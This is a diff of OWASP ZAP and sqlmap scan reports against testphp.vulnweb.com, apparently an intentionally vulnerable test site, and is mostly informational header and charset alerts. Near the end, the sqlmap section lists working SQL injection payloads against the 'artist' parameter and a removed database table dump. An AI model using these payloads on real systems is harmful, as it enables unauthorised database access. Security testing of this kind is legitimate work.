-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg&size=160
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg&size=160
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg&size=160
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg&size=160
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg&size=160
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/signup.php
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/style.css
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/cart.php
-    Method: POST
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: POST
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/guestbook.php
-    Method: POST
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: POST
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/search.php?test=query
-    Method: POST
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: POST
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/secured/newuser.php
-    Method: POST
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: POST
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
-  Alert: Authentication Request Identified, Risk: Informational (Low)
-  Description: <p>The given request has been identified as an authentication request. The 'Other Info' field contains a set of key=value lines which identify any relevant fields. If the request is in a context which has an Authentication Method set to "Auto-Detect" then this rule will change the authentication to match the request identified.</p>
-
+Alert: Authentication Request Identified, Risk: Informational (Low), Confidence: 1
+Description: <p>The given request has been identified as an authentication request. The 'Other Info' field contains a set of key=value lines which identify any relevant fields. If the request is in a context which has an Authentication Method set to "Auto-Detect" then this rule will change the authentication to match the request identified.</p>
 Instances:
 
   URI: http://testphp.vulnweb.com/secured/newuser.php
-    Method: POST
-    Evidence: upass
-    Other Info: userParam=uemail
+
+  Method: POST
+  Evidence: upass
+  Other Info: userParam=uemail
 userValue=ZAP
 passwordParam=upass
 referer=http://testphp.vulnweb.com/signup.php
 
-  Alert: Charset Mismatch (Header Versus Meta Content-Type Charset), Risk: Informational (Low)
-  Description: <p>This check identifies responses where the HTTP Content-Type header declares a charset different from the charset defined by the body of the HTML or XML. When there's a charset mismatch between the HTTP header and content body Web browsers can be forced into an undesirable content-sniffing mode to determine the content's correct character set.</p><p></p><p>An attacker could manipulate content on the page to be interpreted in an encoding of their choice. For example, if an attacker can control content at the beginning of the page, they could inject script using UTF-7 encoded text and manipulate some browsers into interpreting that text.</p>
-
+Alert: Charset Mismatch (Header Versus Meta Content-Type Charset), Risk: Informational (Low), Confidence: 1
+Description: <p>This check identifies responses where the HTTP Content-Type header declares a charset different from the charset defined by the body of the HTML or XML. When there's a charset mismatch between the HTTP header and content body Web browsers can be forced into an undesirable content-sniffing mode to determine the content's correct character set.</p><p></p><p>An attacker could manipulate content on the page to be interpreted in an encoding of their choice. For example, if an attacker can control content at the beginning of the page, they could inject script using UTF-7 encoded text and manipulate some browsers into interpreting that text.</p>
 Instances:
 
   URI: http://testphp.vulnweb.com/
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/AJAX/index.php
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-1] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-1] do not match.
 
   URI: http://testphp.vulnweb.com/artists.php
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/artists.php?artist=1
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/artists.php?artist=2
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/artists.php?artist=3
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/cart.php
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/categories.php
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/disclaimer.php
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/guestbook.php
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/index.php
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=1
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=2
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=3
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=1
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=2
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=3
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=4
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/login.php
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/product.php?pic=1
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/product.php?pic=2
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/product.php?pic=3
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/product.php?pic=4
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/product.php?pic=5
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/product.php?pic=6
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/product.php?pic=7
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/signup.php
-    Method: GET
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: GET
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/cart.php
-    Method: POST
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: POST
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/guestbook.php
-    Method: POST
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: POST
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/search.php?test=query
-    Method: POST
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
+
+  Method: POST
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-2] do not match.
 
   URI: http://testphp.vulnweb.com/secured/newuser.php
-    Method: POST
-    Evidence: 
-    Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-1] do not match.
 
-  Alert: Information Disclosure - Suspicious Comments, Risk: Informational (Low)
-  Description: <p>The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.</p>
+  Method: POST
+  Other Info: There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-1] do not match.
 
+Alert: Information Disclosure - Suspicious Comments, Risk: Informational (Low), Confidence: 1
+Description: <p>The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.</p>
 Instances:
 
   URI: http://testphp.vulnweb.com/AJAX/index.php
-    Method: GET
-    Evidence: where
-    Other Info: The following pattern was used: \bWHERE\b and was detected in the element starting with: "<script type="text/javascript">
+
+  Method: GET
+  Evidence: where
+  Other Info: The following pattern was used: \bWHERE\b and was detected in the element starting with: "<script type="text/javascript">
 
 	var httpreq = null;	
 
@@ -4458,65 +4367,88 @@ Instances:
 
 		var items = XML.getElementsByTagName('i", see evidence field for the suspicious comment/snippet.
 
-  Alert: Modern Web Application, Risk: Informational (Medium)
-  Description: <p>The application appears to be a modern web application. If you need to explore it automatically then the Ajax Spider may well be more effective than the standard one.</p>
-
+Alert: Modern Web Application, Risk: Informational (Medium), Confidence: 2
+Description: <p>The application appears to be a modern web application. If you need to explore it automatically then the Ajax Spider may well be more effective than the standard one.</p>
 Instances:
 
   URI: http://testphp.vulnweb.com/AJAX/index.php
-    Method: GET
-    Evidence: <a href="#" onclick="loadSomething('titles.php')">titles</a>
-    Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
+
+  Method: GET
+  Evidence: <a href="#" onclick="loadSomething('titles.php')">titles</a>
+  Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
 
   URI: http://testphp.vulnweb.com/artists.php
-    Method: GET
-    Evidence: <a href='#' onClick="window.open('./comment.php?aid=1','comment','width=500,height=400')">comment on this artist</a>
-    Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
+
+  Method: GET
+  Evidence: <a href='#' onClick="window.open('./comment.php?aid=1','comment','width=500,height=400')">comment on this artist</a>
+  Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
 
   URI: http://testphp.vulnweb.com/artists.php?artist=1
-    Method: GET
-    Evidence: <a href='#' onClick="window.open('./comment.php?aid=1','comment','width=500,height=400')">comment on this artist</a>
-    Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
+
+  Method: GET
+  Evidence: <a href='#' onClick="window.open('./comment.php?aid=1','comment','width=500,height=400')">comment on this artist</a>
+  Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
 
   URI: http://testphp.vulnweb.com/artists.php?artist=2
-    Method: GET
-    Evidence: <a href='#' onClick="window.open('./comment.php?aid=2','comment','width=500,height=400')">comment on this artist</a>
-    Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
+
+  Method: GET
+  Evidence: <a href='#' onClick="window.open('./comment.php?aid=2','comment','width=500,height=400')">comment on this artist</a>
+  Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
 
   URI: http://testphp.vulnweb.com/artists.php?artist=3
-    Method: GET
-    Evidence: <a href='#' onClick="window.open('./comment.php?aid=3','comment','width=500,height=400')">comment on this artist</a>
-    Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
+
+  Method: GET
+  Evidence: <a href='#' onClick="window.open('./comment.php?aid=3','comment','width=500,height=400')">comment on this artist</a>
+  Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=1
-    Method: GET
-    Evidence: <a href='#' onClick="window.open('./comment.php?pid=1','comment','width=500,height=400')">comment on this picture</a>
-    Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
+
+  Method: GET
+  Evidence: <a href='#' onClick="window.open('./comment.php?pid=1','comment','width=500,height=400')">comment on this picture</a>
+  Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=2
-    Method: GET
-    Evidence: <a href='#' onClick="window.open('./comment.php?pid=7','comment','width=500,height=400')">comment on this picture</a>
-    Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
+
+  Method: GET
+  Evidence: <a href='#' onClick="window.open('./comment.php?pid=7','comment','width=500,height=400')">comment on this picture</a>
+  Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=1
-    Method: GET
-    Evidence: <a href='#' onClick="window.open('./comment.php?pid=1','comment','width=500,height=400')">comment on this picture</a>
-    Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
+
+  Method: GET
+  Evidence: <a href='#' onClick="window.open('./comment.php?pid=1','comment','width=500,height=400')">comment on this picture</a>
+  Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=2
-    Method: GET
-    Evidence: <a href='#' onClick="window.open('./comment.php?pid=6','comment','width=500,height=400')">comment on this picture</a>
-    Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
 
-  Alert: User Controllable HTML Element Attribute (Potential XSS), Risk: Informational (Low)
-  Description: <p>This check looks at user-supplied input in query string parameters and POST data to identify where certain HTML attribute values might be controlled. This provides hot-spot detection for XSS (cross-site scripting) that will require further review by a security analyst to determine exploitability.</p>
+  Method: GET
+  Evidence: <a href='#' onClick="window.open('./comment.php?pid=6','comment','width=500,height=400')">comment on this picture</a>
+  Other Info: Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.
 
+Alert: User Agent Fuzzer, Risk: Informational (Medium), Confidence: 2
+Description: <p>Check for differences in response based on fuzzed User Agent (eg. mobile sites, access as a Search Engine Crawler). Compares the response statuscode and the hashcode of the response body with the original response.</p>
+Instances:
+
+  URI: http://testphp.vulnweb.com/
+
+  Method: GET
+
+  URI: http://testphp.vulnweb.com/
+
+  Method: GET
+
+  URI: http://testphp.vulnweb.com/
+
+  Method: GET
+
+Alert: User Controllable HTML Element Attribute (Potential XSS), Risk: Informational (Low), Confidence: 1
+Description: <p>This check looks at user-supplied input in query string parameters and POST data to identify where certain HTML attribute values might be controlled. This provides hot-spot detection for XSS (cross-site scripting) that will require further review by a security analyst to determine exploitability.</p>
 Instances:
 
   URI: http://testphp.vulnweb.com/guestbook.php
-    Method: POST
-    Evidence: 
-    Other Info: User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:
+
+  Method: POST
+  Other Info: User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:
 
 http://testphp.vulnweb.com/guestbook.php
 
@@ -4530,9 +4462,9 @@ The user-controlled value was:
 add message
 
   URI: http://testphp.vulnweb.com/search.php?test=query
-    Method: POST
-    Evidence: 
-    Other Info: User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:
+
+  Method: POST
+  Other Info: User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:
 
 http://testphp.vulnweb.com/search.php?test=query
 
@@ -4546,9 +4478,9 @@ The user-controlled value was:
 gobutton
 
   URI: http://testphp.vulnweb.com/search.php?test=query
-    Method: POST
-    Evidence: 
-    Other Info: User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:
+
+  Method: POST
+  Other Info: User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:
 
 http://testphp.vulnweb.com/search.php?test=query
 
@@ -4570,49 +4502,19 @@ sqlmap identified the following injection point(s) with a total of 56 HTTP(s) re
 Parameter: artist (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: artist=1 AND 5855=5855
+    Payload: artist=1 AND 5968=5968
 
     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: artist=1 AND (SELECT 8209 FROM (SELECT(SLEEP(5)))SchF)
+    Payload: artist=1 AND (SELECT 3912 FROM (SELECT(SLEEP(5)))mlcY)
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 3 columns
-    Payload: artist=-9800 UNION ALL SELECT CONCAT(0x7170626b71,0x576e70544879756a5364496e456d675779456b6d786176687668576b554b636f4a75586a4b6f784d,0x71706a6b71),NULL,NULL-- -
+    Payload: artist=-1643 UNION ALL SELECT NULL,CONCAT(0x7171707871,0x706a4443646a6851644657557076457a5350716149784f55446e4241657379594e6a5764574e5a50,0x7176767a71),NULL-- -
 ---
 web server operating system: Linux Ubuntu
-web application technology: Nginx 1.19.0, PHP 5.6.40
+web application technology: PHP 5.6.40, Nginx 1.19.0
 back-end DBMS: MySQL >= 5.0.12
-Database: acuart
-Table: products
-[3 entries]
-+----+-------+---------------------------------------------------+--------------------------------+--------------------------------------------+
-| id | price | name                                              | rewritename                    | description                                |
-+----+-------+---------------------------------------------------+--------------------------------+--------------------------------------------+
-| 1  | 359   | Network Storage D-Link DNS-313 enclosure 1 x SATA | network-attached-storage-dlink | NET STORAGE ENCLOSURE SATA DNS-313 D-LINK  |
-| 2  | 10    | Web Camera A4Tech PK-335E                         | web-camera-a4tech              | Web Camera A4Tech PK-335E                  |
-| 3  | 812   | Laser Color Printer HP LaserJet M551dn, A4        | color-printer                  | Laser Color Printer HP LaserJet M551dn, A4 |
-+----+-------+---------------------------------------------------+--------------------------------+--------------------------------------------+
-
-Database: acuart
-Table: artists
-[3 entries]
-+-----------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+
